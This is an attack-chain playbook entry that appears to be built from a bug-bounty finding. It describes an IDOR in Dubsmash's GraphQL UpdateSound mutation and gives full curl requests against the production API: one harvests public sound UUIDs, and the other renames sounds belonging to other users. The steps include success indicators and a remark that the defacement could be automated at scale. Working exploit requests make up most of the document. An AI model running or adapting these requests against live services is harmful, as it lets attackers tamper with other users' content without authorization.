---
id: ac-idor-updatesound-deface
tags:
  - idor
  - graphql
  - authorization-bypass
  - defacement
  - api-exploit
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
verified: false
platforms:
  - Web
  - Mobile (iOS)
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Fetch-Public-Sound-UUIDs-via-RecommendedRichSounds]]'
  - '[[procedures/Replay-and-Modify-UpdateSound-Mutation-for-IDOR]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Internal Defacement]]'
updated_at: '2025-12-14T17:29:28.345Z'
description: >-
  Authenticated users exploit missing authorization checks in the UpdateSound
  GraphQL mutation to edit and deface sound track titles owned by other users
  using publicly accessible UUIDs.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Internal Defacement]]'
---
# IDOR in UpdateSound GraphQL Mutation to Deface User Sound Titles

Multi-stage attack chain demonstrating exploitation of improper authorization in Dubsmash's GraphQL API to edit other users' sound titles, enabling defacement and disruption of the sound library.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Fetch Public UUIDs] --> B[Authenticate and Replay Mutation]
    B --> C[Modify Target UUID and Malicious Name]
    C --> D[Submit Update for Defacement]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Dubsmash GraphQL API at gateway-production.dubsmash.com
- Required services/ports: HTTPS (443)
- Network access requirements: Internet access to the API endpoint

### Initial Access Requirements

- Valid authenticated Bearer token (e.g., from a Dubsmash user account)
- Network position: External attacker with API access
- Prior access needed: Authenticated session

## Detailed Attack Procedures

### Step 1: Fetch Public Sound UUIDs
procedure: [[procedures/Fetch-Public-Sound-UUIDs-via-RecommendedRichSounds]]

**Objective**: Retrieve publicly accessible UUIDs of sound tracks from the recommended sounds endpoint to identify targets for modification.

**Instructions**: Use [[commands/curl-fetch-recommended-sounds]] to query the RecommendedRichSounds GraphQL endpoint:

```bash
curl -i -s -k -X 'POST' -H 'Host: gateway-production.dubsmash.com' -H 'X-Dmac: a252a66f19e030696d2b70ae2cff527b32e9add33475af6ab192595017f6b4ea' -H 'X-Remote-Config-Values: []' -H 'X-Time: 1613160805' -H 'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H 'X-Accept-Content-Language: en_IN' -H 'X-Device-Timezone: 19800' -H 'X-Device-Language: en' -H 'X-Device-Country: IN' -H 'X-Build-Number: 45431' -H 'Content-Length: 1065' -H 'X-App-Version: 5.20.0' -H 'X-Platform: ios' -H 'Connection: close' -H 'Authorization: Bearer xxxxxxxxx' -H 'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H 'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'X-Dmac-Version: 2' -H 'If-None-Match: W/\"7d-SQTt6RA1iQk+sK3Hcqc774a67/I\"' -b '__cfduid=d42d0391d8f2c2d8bf5107a6ceda7c2f61610738889' --data-binary '{"variables":{"next":null},"query":"query RecommendedRichSounds($next: String) {\n recommendations(next: $next, type: SOUND) {\n __typename\n next\n results {\n __typename\n recommendation_identifier\n score\n updated_at\n object {\n __typename\n ... on Sound {\n ...RichSoundFragment\n }\n }\n }\n }\n}\nfragment RichSoundFragment on Sound {\n __typename\n uuid\n created_at\n sound\n name\n waveform_raw_data\n liked\n soundStatus: status\n creator {\n __typename\n ...ContentCreatorFragment\n }\n share_link\n num_likes\n num_videos\n top_videos {\n __typename\n ...TopVideoFragment\n }\n}\nfragment ContentCreatorFragment on User {\n __typename\n username\n uuid\n date_joined\n followed\n has_invite_badge\n badges\n profile_picture\n}\nfragment TopVideoFragment on Video {\n __typename\n uuid\n video_data {\n __typename\n mobile {\n __typename\n thumbnail\n }\n }\n creator {\n __typename\n uuid\n username\n }\n}"}' 'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'
```

**Expected Output**: JSON response containing a 'recommendations' array with sound objects, each including 'uuid', 'name', and 'creator' details.

**Success Indicators**:
- UUIDs extracted from the response (e.g., 'a687eb61ad814a09a8a85cedef7837f3')
- Multiple public sounds listed for targeting

### Step 2: Authenticate and Replay UpdateSound Mutation
procedure: [[procedures/Replay-and-Modify-UpdateSound-Mutation-for-IDOR]]

**Objective**: Replay the authenticated UpdateSound mutation request to prepare for modification of a target sound.

**Instructions**: Prepare the base UpdateSound mutation using your valid Bearer token, but do not modify yet. This step ensures authentication works.

**Expected Output**: Initial response confirming the mutation structure is valid.

**Success Indicators**:
- 200 OK response from the API
- No authentication errors

### Step 3: Modify UUID and Set Malicious Name
procedure: [[procedures/Replay-and-Modify-UpdateSound-Mutation-for-IDOR]]

**Objective**: Alter the UUID parameter to target a victim's sound and change the title to malicious content.

**Instructions**: Modify the variables in the request body to use a victim's UUID and a defacing name, then execute using [[commands/curl-update-sound-title]]:

```bash
curl -i -s -k -X 'POST' -H 'Host: gateway-production.dubsmash.com' -H 'X-Dmac: ' -H 'X-Remote-Config-Values: []' -H 'X-Time: 1613158267' -H 'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H 'X-Accept-Content-Language: en_IN' -H 'X-Device-Timezone: 19800' -H 'X-Device-Language: en' -H 'X-Device-Country: IN' -H 'X-Build-Number: 45431' -H 'Content-Length: 676' -H 'X-App-Version: 5.20.0' -H 'X-Platform: ios' -H 'Connection: close' -H 'Authorization: Bearer XXXXXX' -H 'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H 'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'X-Dmac-Version: 2' -H 'If-None-Match: W/\"88-IVjhmW06Njcacim4nwHnJNviYsE\"' -b ' cfduid=' --data-binary '{"query":"mutation UpdateSound($input: UpdateSoundInput!) {\n updateSound(input: $input) {\n** typename\n sound {\n **typename\n ...SoundFragment\n }\n }\n}\n...","variables":{"input":{"uuid":"a687eb61ad814a09a8a85cedef7837f3","name":"test12355556777"}}}' 'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'
```

**Expected Output**: JSON response with the updated sound object showing the new 'name' field.

**Success Indicators**:
- Title changed in response (e.g., to 'test12355556777')
- No ownership error from API

### Step 4: Submit and Verify Defacement
procedure: [[procedures/Replay-and-Modify-UpdateSound-Mutation-for-IDOR]]

**Objective**: Submit the modified request and confirm the defacement impacts the sound library visibility.

**Instructions**: The submission in Step 3 updates immediately; re-query the sound using Step 1's command with the UUID to verify the change persists.

**Expected Output**: Queried sound now shows the malicious title in the public library.

**Success Indicators**:
- Malicious title visible in app's sound recommendations
- Potential for automation to scale defacement

## Attack Chain Summary

### Key Achievements

1. Retrieved public UUIDs without restrictions
2. Bypassed ownership checks to edit foreign sounds
3. Defaced titles, disrupting user experience and trust

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Internal Defacement]] Internal Defacement

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Impact]] Impact

---
*Last updated: 2023-10-01T00:00:00Z*
